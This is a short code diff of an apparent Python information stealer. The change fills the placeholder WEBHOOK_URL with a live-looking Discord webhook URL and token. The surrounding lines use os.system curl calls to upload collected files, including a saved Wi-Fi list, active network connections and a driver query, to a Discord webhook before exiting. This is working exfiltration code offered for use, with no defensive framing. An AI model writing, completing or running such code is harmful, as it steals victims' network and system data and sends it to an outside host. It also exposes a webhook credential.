@@ -3,7 +3,7 @@ import re
 import json
 from urllib.request import Request, urlopen
 
-WEBHOOK_URL = 'WEBHOOK HERE' # PUT WEBHOOK HERE
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1416338920907473087/eMm9X2-COmfQyZsgppXkukAMRODoVz1apS4w5UsRL-309eQ40Iz-w7TboOCb9EEa25RS' # PUT WEBHOOK HERE
 
 PING_ME = False
 
@@ -79,3 +79,4 @@ os.system('''curl -i -H 'Expect: application/json' -F file=@Files\WiFi-List.txt 
 os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ActiveConnections.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
 os.system('''curl -i -H 'Expect: application/json' -F file=@Files\driverquery.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
 exit()
+
